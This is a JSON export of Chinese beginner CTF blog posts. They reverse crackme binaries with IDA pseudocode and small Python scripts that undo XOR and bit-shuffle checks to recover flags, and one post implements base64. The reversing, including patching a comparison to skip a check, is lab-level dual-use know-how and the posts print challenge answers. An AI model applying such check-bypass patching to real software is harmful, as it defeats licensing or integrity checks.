120247815040203971878156401336064195859617475109255488973983177090503841094270099798091750950310387020985631462241773194856928204176366565203099326711551950860726971729471331094591029476222036323301387584932169743858328653144427714133805588252752063520123349229781762269259290641902996030408389845608487018053Le = 104267926052681232399022097693567945566792104266393042997592419084595590842792587289837162127972340402399483206179123720857893336658554734721858861632513815134558092263747423069663471743032485002524258053046479965386191422139115548526476836214275044776929064607168983831792995196973781849976905066967868513707LF = (a,b,c,d,e)m = 8804961678093749244362737710317041066205860704668932527558424153061050650933657852195829452594083176433024286784373401822915616916582813941258471733233011Lg = 67051725181167609293818569777421162357707866659797065037224862389521658445401Lz = []for i, f in enumerate(F): n = pow(f, m, g) this_is = &apos;Y-Combinator&apos; l = (lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda x: (1 if x &lt; 2 else f(x - 1) * x % n))(g % 27777) c = raw_input(&apos;Channenge #%d:&apos; % i) if int(c) != l: print &apos;Wrong~&apos; exit() z.append(l)z.sort()gg = &apos;(flaSg\\&apos;7 \\\\h#GiQwt~66\\x0csxCN]4sT&#123;? Zx YCf6S&gt;|~`\\x0c$/&#125;\\&apos;\\r:4DjJFvm]([sP%FMY&quot;@=YS;CQ7T#zx42#$S_j0\\\\Lu^N31=r\\x0b\\t\\tjVhhb_KM$|6]\\nl!:V\\rx8P[0m ;ho_\\rR(0/~9HgE8!ec*AsGd[e|2&amp;h!&#125;GLGt\\&apos;=$\\x0cbKFMnbez-q\\\\`I~];@$y#bj9K0xmI2#8 sl^gBNL@fUL\\x0b\\\\9Ohf]c&gt;Vj/&gt;rnWXgLP#&lt;+4$BG@,\\&apos;n a_7C:-&#125;f(WO8Y\\x0c2|(nTP!\\&apos;\\\\&gt;^\\&apos;&#125;-7+AwBV!w7KUq4Qpg\\tf.&#125;Z7_!m+ypy=`3#\\\\=?9B4=?^&#125;&amp;\\&apos;~ Z@OH8\\n0=6\\x0b\\tv\\nl!G\\&apos;y4dQW5!~g~I*f&quot;rz1&#123;qQH&#123;G9\\x0c\\&apos;b\\x0cp\\x0bdu!2/\\\\@i4eG&quot;If0A&#123;-)N=6GMC&lt;U5/ds\\rG&amp;z&gt;P1\\nsq=5&gt;dFZUWtjv\\tX~^?9?Irwx\\\\5A!32N\\x0bcVkx!f)sVY Men\\x0c\\&apos;ujN&lt;&quot;LJ\\x0c5R4&quot;\\\\\\\\XPVA\\&apos;m$~tj)Br&#125;C&#125;&amp;kX2&lt;|\\np3XtaHB.P\\&apos;(E 4$dm!uDyC%u [&quot;x[VYw=1aDJ (8V/a!J?`_r:n7J88!a25AZ]#,ab?&#123;%e\\x0b]wN_&#125;*Q:mh&gt;@]u\\t&amp;6:Z*Fmr?U`cOHbAf7s@&amp;5~L ,\\tQ18 -Hg q2nz%\\x0ccUm=dz&amp;h1(ozoZ)mrA=`HKo\\n\\&apos;rXm&#125;Z-l3]WgN\\\\NW&lt;&#123;o=)[V(&#123;7&lt;N1.-A8S&quot;=;3sderb\\tOZ$K\\r0o/5\\x0bMc76EGCWJ3IQpr7!QhbgzX8uGe3&lt;w-g\\&apos;/j\\&apos;\\tM4|9l?i&amp;tm_\\n57X0B2rOpuB@H@%L_\\r)&amp;/q=LZa(%&#125;&quot;&quot;#if#Kq74xK?`jGFOn&quot;8&amp;^3Q-\\r#]E$=!b^In0:$4VKPXP0UK=IK)Y\\rstOT40=?DyHor8j7O\\\\r/~ncJ5];cCT)c?OS0EM5m#V(-%&quot;Tu:!UsE],0Dp s@HErS]J&#123;%oH54B&amp;(zE.(@5#2k\\tJnNlnUEij\\\\.q/3HBpJNk*X(k5;DlqK\\&apos;\\&apos;fX\\r&#125;EBk_7\\x0b:&gt;8~\\t+M@WJx.PO(&#123;/U&#125;1&#125;#TqjreG\\nN&#123;\\rX&gt;4EsJr0Pn\\\\Z\\\\aL/-U&lt;&lt;&#123;,Q;j\\tF=7f\\&apos;)+wH:p&#123;G=_.s\\\\t-\\x0bI\\x0c*y\\t1P:Y|/2xE&lt;uo]~$&gt;5k]FW+&gt;fR&lt;QA&quot;(Fj[LL(hzfQo#PJ;:*0kB~3]9uL[o.xue:VQ\\t;9-Tu\\tq|mzzhV_okP\\t,d\\rQ`]5Gf\\x0c#gXB\\x0cAH|)NI|K=KW-&amp;p-&lt;b&quot;3e.rO\\x0cuK=\\x0c^\\r+MuLxCJ`UKaD\\x0bBH&amp;n+YVajZ(U7pwWtto3T10VLHwSJ\\rK\\t&#125;\\&apos;F$l1:b2Bd\\na=#t0iq&#125;#!&#123;1_)w$&#125;&lt;Dp(borC\\&apos;\\t?r6;,+k;a(Q3@B?RCWYEDrjZe![x=n_%S]rl&#123;&amp;fLr*mgCD;92/nNsaxKy/;\\nr]sPK=`+YP&gt;MmfB\\n8O4/&quot;&#125;nE7r*=41f2\\t37&gt;K\\&apos;s$wpl;qS[`qzu\\x0b\\t\\nuaU|b,C`4&amp; dRN~]7DnuTb2FhNHV!#Z2Hho\\x0b[%.&#123;O\\t$q0\\x0ch_@?w@b8[I^&#123;JL|O8]i8&#123;p)A.w)14qK3JoyF%licZ~ga\\rW[L:W\\rtIvfWJjZUOvB\\rS.Beav3!-@bw|PexJ Pcw1\\ry6!63B&#125;]J])6fak/3r]W\\tMeXt[uc(1_U lys&#123;a1X\\r%)[wwP3rhgNW&#123;*d~_E%Q2htCt5ha@l0^0=\\x0bwT\\ni4/V;_\\nM1rb?w~Q)Dli4u\\n`&#125;1+D8&quot;\\t`@V~$9l$Uy**VnI (@Ga0&lt;RxfmoNgJTtE-aLH\\rE5fMy7rk$)V\\rL2Fv/AivOa&quot;\\nuX|70Xrw^D]%i%JyT\\x0cc%cwZ/Wbp=IiY;/@nFEe&gt;3=tM;K*`fReGoc5V/Ri?nXZ-RW)\\&apos;\\t&lt;\\x0cV&gt;@X@-Ei4%sO%&#125;,B_pjc`s&quot;@oKCmdgDhjUZT@?mb\\&apos;?Q:F\\x0bLJkPgjaFAc=rbrjAz$Zz\\x0cq0GU!&quot;)xFOEF(x!3M\\t:l83|&#125;&#125;HgGJJ#eT/I\\x0b[|lK_n+;Wi/N^B4LzL.a(gVWq,zO6\\&apos;S|tb&gt;RX` ca*CO&lt;w\\x0ci =wc1,M~\\x0bc`FYEs\\r)&#123;+Ll8[I9-88m\\t\\\\iK/\\\\hno-C[vX*3Hx:%:K\\rt\\x0cW!tj\\&apos;SOhqxP|k7cw Hm?I@?P\\&apos;HmapG7$0#T(Auz]sjmd#\\rFP/&#125;53@-Kvmi(d%dZKLZ2LK\\&apos;e_E\\x0bQmR 5/(irq4-EUyp&lt;hB?[\\tnU:p*xuzASM&apos;print &apos;&apos;.join((gg[(lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda n: (1 if n &lt; 3 else f(n - 1) + f(n - 2)))(i + 2)] for i in range(16))) % &apos;&apos;.join((data[pow((__import__(&apos;fractions&apos;).gcd(z[i % 5], z[(i + 1) % 5]) * 2 + 1) * g, F[i % 5] * (i * 2 + 1), len(data))] for i in range(32))) 先运行一波： 123sH1rkEr:desktop macbook$ python 1.pyChannenge #0:111Wrong~ 观察到print ‘Wrong~’ 上面的if int(c) != l 可能就是判断条件，把!=改成==尝试一波 1234567sH1rkEr:desktop macbook$ python 1.pyChannenge #0:1Channenge #1:1Channenge #2:122313Channenge #3:123Channenge #4:13flag is FLAG&#123;VBXDVV4jkVVS4hVVj7NVV1heVVX1jVVh&#125; flag get 话说只能做做这种简单的题目了QAQ","categories":[],"tags":[]},{"title":"sus-helloworld","slug":"sus-helloworld","date":"2018-09-22T16:19:46.000Z","updated":"2018-09-22T16:28:18.670Z","comments":true,"path":"2018/09/23/sus-helloworld/","link":"","permalink":"http://yoursite.com/2018/09/23/sus-helloworld/","excerpt":"","text":"题目地址 ida启动 main函数: 123456789101112131415161718192021*(_DWORD *)flag = 0xC881E8F1;*(_DWORD *)&amp;flag[4] = 0xCECF81D2;*(_DWORD *)&amp;flag[8] = 0x81C081D5;*(_DWORD *)&amp;flag[12] = 0xC8D5C0D3;*(_DWORD *)&amp;flag[16] = 0xCDC0CFCE;*(_DWORD *)&amp;flag[20] = 0xCCD4CF81;*(_DWORD *)&amp;flag[24] = 0x8FD3C4C3;flag[28] = 0;printf(&quot;What is magic number? &quot;);__isoc99_scanf(&quot;%d&quot;, &amp;n);if ( n == 0x12B9B0A1 )&#123; for ( i = 0; flag[i]; ++i ) flag[i] ^= n; printf(&quot;Flag is FLAG&#123;%s&#125;\\n&quot;, flag);&#125;else&#123; puts(&quot;Try Hard.&quot;);&#125;return 0; 如果输入的n为0x12b9b0a1，flag[i]^=n 通过汇编命令可以发现此处n取一个byte，也就是0xa1 逆运算脚本如下： 123456789101112flag=[0xf1,0xe8,0x81,0xc8,0xd2,0x81,0xcf,0xce,0xd5,0x81,0xc0,0x81,0xd3,0xc0,0xd5,0xc8,0xce,0xcf,0xc0,0xcd,0x81,0xcf,0xd4,0xcc,0xc3,0xc4,0xd3,0x8f]s=&apos;&apos;for i in flag: i^=0xa1 s+=chr(i)print s flag get 因为不会啥操作，所以flag list只能手打了……","categories":[],"tags":[]},{"title":"sus-bitx","slug":"bitx","date":"2018-09-22T11:33:03.000Z","updated":"2018-09-22T16:19:09.808Z","comments":true,"path":"2018/09/22/bitx/","link":"","permalink":"http://yoursite.com/2018/09/22/bitx/","excerpt":"","text":"题目地址 拖进ida，主函数一目了然，直接进入验证函数： 123456for ( i = 0; *(_BYTE *)(i + a1) &amp;&amp; *(_BYTE *)(i + 0x804A040); ++i )&#123; if ( *(_BYTE *)(i + a1) + 9 != ((unsigned __int8)((*(_BYTE *)(i + 0x804A040) &amp; 0xAA) &gt;&gt; 1) | (unsigned __int8)(2 * (*(_BYTE *)(i + 0x804A040) &amp; 0x55))) ) return 0;&#125;return 1; 将输入与0x804a040处的值经过一系列运算后比较若不相等则gg，直接写脚本： 123456final=[0x8F,0x0AA,0x85,0x0A0,0x48,0x0AC,0x40,0x95,0x0B6,0x16,0x0BE,0x40,0x0B4,0x16,0x97,0x0B1,0x0BE,0x0BC,0x16,0x0B1,0x0BC,0x16,0x9D,0x95,0x0BC,0x41,0x16,0x36,0x42,0x95,0x95,0x16,0x40,0x0B1,0x0BE,0x0B2,0x16,0x36,0x42,0x3D,0x3D,0x49]flag=finalfor i in range(len(final)): flag[i]=((final[i]&amp;0xaa)&gt;&gt;1|2*(final[i]&amp;0x55) )-9out=&apos;&apos;.join([chr(i) for i in flag])print out flag get","categories":[],"tags":[]},{"title":"base64","slug":"base64","date":"2018-09-22T06:58:58.000Z","updated":"2018-09-22T07:09:04.289Z","comments":true,"path":"2018/09/22/base64/","link":"","permalink":"http://yoursite.com/2018/09/22/base64/","excerpt":"","text":"百度了一会base64，在吾爱破解上发现了一篇讲解很详细的文章，于是尝试自己实现base64加密 12345678910111213141516171819202122232425262728293031323334353637383940letters=[&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;,&apos;I&apos;,&apos;J&apos;,&apos;K&apos;,&apos;L&apos;,&apos;M&apos;,&apos;N&apos;,&apos;O&apos;,&apos;P&apos;,&apos;Q&apos;,&apos;R&apos;,&apos;S&apos;,&apos;T&apos;,&apos;U&apos;,&apos;V&apos;,&apos;W&apos;,&apos;X&apos;,&apos;Y&apos;,&apos;Z&apos;,&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;j&apos;,&apos;k&apos;,&apos;l&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;r&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;,&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;,&apos;+&apos;, &apos;/&apos;]def encode(str_input): str_output=&apos;&apos; list_input=[&apos;&#123;:0&gt;8&#125;&apos;.format(str(bin(ord(str_input[i]))).replace(&apos;0b&apos;, &apos;&apos;)) for i in range(len(str_input))] compensate=0 while list_input: list_temp=list_input[:3] while len(list_temp)%3: compensate+=1 list_temp.append(&apos;0&apos;*8) str_temp=&apos;&apos;.join(list_temp) list_str_temp=[str_temp[i:i+6] for i in [0,6,12,18]] list_str_temp=[int(i,2) for i in list_str_temp] str_output+=&apos;&apos;.join(letters[i] for i in list_str_temp) list_input=list_input[3:] str_output+=&apos;=&apos;*compensate return str_outputdef decode(str_input): str_output=&apos;&apos; list_input=[&apos;&#123;:0&gt;6&#125;&apos;.format(str(bin(letters.index(i))).replace(&apos;0b&apos;, &apos;&apos;))for i in str_input if i != &apos;=&apos;] compensate=0 for i in str_input: if i == &apos;=&apos;: compensate+=1 while list_input: list_temp=list_input[:4] str_temp=&apos;&apos;.join(list_temp) while len(str_temp)%8: str_temp=str_temp[0:-1*2*compensate] list_str_temp=[str_temp[i:i+8] for i in [0,8,16]] list_str_temp=[int(i,2) for i in list_str_temp] str_output+=&apos;&apos;.join([chr(i)for i in list_str_temp]) list_input=list_input[4:] return str_outputs=&quot;sadadsadaddasdadas&quot;d=&apos;c2FkYWRzYWRhZGRhc2RhZGFz&apos;print encode(s)print decode(d) 运行： 123sH1rkEr:desktop macbook$ python base64.pyc2FkYWRzYWRhZGRhc2RhZGFzsadadsadaddasdadas 终于是成功了，编写过程中由于字符串和list的问题总是出错，还是要多看看python","categories":[],"tags":[]},{"title":"CGCTF-480小时精通c++","slug":"480小时","date":"2018-09-20T16:52:52.000Z","updated":"2019-03-05T15:35:53.219Z","comments":true,"path":"2018/09/21/480小时/","link":"","permalink":"http://yoursite.com/2018/09/21/480小时/","excerpt":"","text":"听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先…… 题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步…… ida启动！main函数伪代码如下： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; signed int i; // [rsp+Ch] [rbp-54h] __int64 v5; // [rsp+10h] [rbp-50h] __int64 v6; // [rsp+18h] [rbp-48h] __int64 v7; // [rsp+20h] [rbp-40h] __int64 v8; // [rsp+28h] [rbp-38h] int v9; // [rsp+30h] [rbp-30h] char v10; // [rsp+34h] [rbp-2Ch] unsigned __int64 v11; // [rsp+58h] [rbp-8h] v11 = __readfsqword(0x28u); v5 = 7652827924304847970LL; v6 = 6588269719570178159LL; v7 = 0615273543157435660505LL; v8 = 4932672475662219355LL; v9 = 2099869557; v10 = 0; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((__int64)&amp;std::cout, (__int64)&quot;The Encrypted Flag is: &quot;); for ( i = 0; i &lt;= 35; ++i ) printf(&quot;%02x&quot;, *((unsigned __int8 *)&amp;v5 + i)); std::ostream::operator&lt;&lt;((__int64)&amp;std::cout, (__int64)std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); return 0;&#125; 很容易发现输出了加密后的flag，也就是v5-v9中的值，按r键转换成字符型，得加密flag:bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)} 进入汇编界面发现输出”The Encrypted Flag is: “前被nop了一段，应该就是加密函数。 左侧函数列表中有480个名为_X1C_CG_EncryptFunction的函数，实现output[i]^=string[i%len(string)]^i，区别就是这480个函数中的string是从“001001001”到“480480480”。所以可以知道flag经过了这480个函数的加密后，就变成了bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)}。 逆运算脚本如下： 1234567891011121314#!/usr/bin/env pythonkey=[]for i in range(1,481): n=str(i) key.append(n.zfill(3)*3)final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;flag=finalfor i in range(479,-1,-1): a=key[i] for j in range(35,-1,-1): s=ord(flag[j]) s^=ord(a[j%9])^j flag=flag.replace(flag[j],chr(s),1)print flag 于是得到了flag 可能由于并不会替换字符串中特定下标处的值，所以并没有得到flag……向大佬求救尚未得到回复…… 两小时后原因没错，通过百度了一会python中字符串替换的问题，找到了正确的替换方式： 12345678910111213141516#!/usr/bin/env pythonkey=[]for i in range(1,481): n=str(i) key.append(n.zfill(3)*3)final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;flag=finalflag1=list(flag)for i in range(479,-1,-1): a=key[i] for j in range(36): s=ord(flag1[j]) s^=ord(a[j%9])^j flag1[j]=chr(s)flag=&apos;&apos;.join(flag1)print flag flag get！ 通过大佬的指点终于是完成了这一道简单题，明明知道了怎么去逆运算，结果因为python不会用的原因忙了这么久……要学的太多","categories":[],"tags":[]}]}